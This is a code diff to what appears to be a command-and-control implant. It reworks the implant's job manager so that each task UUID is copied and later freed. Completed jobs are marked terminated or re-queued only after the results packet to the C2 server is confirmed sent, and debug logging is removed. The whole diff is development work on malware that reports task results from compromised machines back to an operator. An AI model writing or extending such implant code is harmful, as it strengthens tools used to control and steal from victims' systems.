@@ -33,10 +33,12 @@ auto DECLFN Jobs::Create(
 
     ULONG cmdID = Self->Psr->Int16( JobPsr );
 
+    NewJob->UUID = (CHAR*)KhAlloc( Str::LengthA(UUID) + 1 );
+    Mem::Copy( NewJob->UUID,UUID, Str::LengthA(UUID) + 1 );
+
+    NewJob->CmdID    = cmdID;
     NewJob->ExitCode = -1;
     NewJob->State    = KH_JOB_PRE_START;
-    NewJob->CmdID    = cmdID;
-    NewJob->UUID     = UUID;
     NewJob->Psr      = JobPsr;
     NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );
     NewJob->Clean    = TRUE;
@@ -72,28 +74,14 @@ auto DECLFN Jobs::Send(
 ) -> VOID {
     JOBS* Current = List;
 
-    BYTE*  Data   = nullptr;
-    UINT64 Lenght = 0;
-
     while ( Current ) {
         if ( 
             Current->State    == KH_JOB_READY_SEND &&
             Current->ExitCode == EXIT_SUCCESS
         ) {
-            KhDbg( "concatenating job: %s", Current->UUID );
-            KhDbg( "data at %p [%d bytes]", Current->Pkg->Buffer, Current->Pkg->Length );
-
             Self->Pkg->Int32( PostJobs, PROFILE_C2 );
             Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
             Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
-
-            Current->State = KH_JOB_TERMINATE;
-            
-            if( ! Current->Clean ) {
-                Current->State = KH_JOB_RUNNING;
-                Self->Pkg->Destroy( Current->Pkg );
-                Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
-            }
         } else if ( 
             Current->State    == KH_JOB_READY_SEND && 
             Current->ExitCode != EXIT_SUCCESS      &&
@@ -112,10 +100,8 @@ auto DECLFN Jobs::Send(
 
             MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );
 
-            ULONG PkgLen = MsgLen + 2 + 40 + sizeof( INT16 ) + sizeof( INT32 );
-
             Self->Pkg->Int32( PostJobs, PROFILE_C2 );
-            Self->Pkg->Int32( PostJobs, PkgLen );
+            Self->Pkg->Int32( PostJobs, MsgLen + 2 + 40 + sizeof(INT16) + sizeof(INT32) );
 
             Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
             Self->Pkg->Int16( PostJobs, (INT16)Action::Task::Error );
@@ -127,16 +113,28 @@ auto DECLFN Jobs::Send(
             } else {
                 Self->Pkg->Str( PostJobs, Unknown );
             }
-
-            Current->State = KH_JOB_TERMINATE;
         }
         
         Current = Current->Next;
     }
     
-    Self->Pkg->Transmit( PostJobs, (PVOID*)0, 0 );
+    BOOL Sent = Self->Pkg->Transmit( PostJobs, (PVOID*)0, 0 );
 
-    return;
+    if ( Sent ) {
+        Current = List;
+        while ( Current ) {
+            if ( Current->State == KH_JOB_READY_SEND ) {
+                if ( Current->Clean ) {
+                    Current->State = KH_JOB_TERMINATE;
+                } else {
+                    Current->State = KH_JOB_RUNNING;
+                    Self->Pkg->Destroy( Current->Pkg );
+                    Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
+                }
+            }
+            Current = Current->Next;
+        }
+    }
 }
 
 auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
@@ -180,6 +178,12 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
                     KhFree( ToRemove->Destroy );
                 }
                 ToRemove->Destroy = nullptr;
+            }
+
+            if ( ToRemove->UUID ) {
+                if ( Self->Hp->CheckPtr( ToRemove->UUID ) ) {
+                    KhFree( ToRemove->UUID );
+                }
             }
 
             if ( Self->Hp->CheckPtr( ToRemove ) ) {
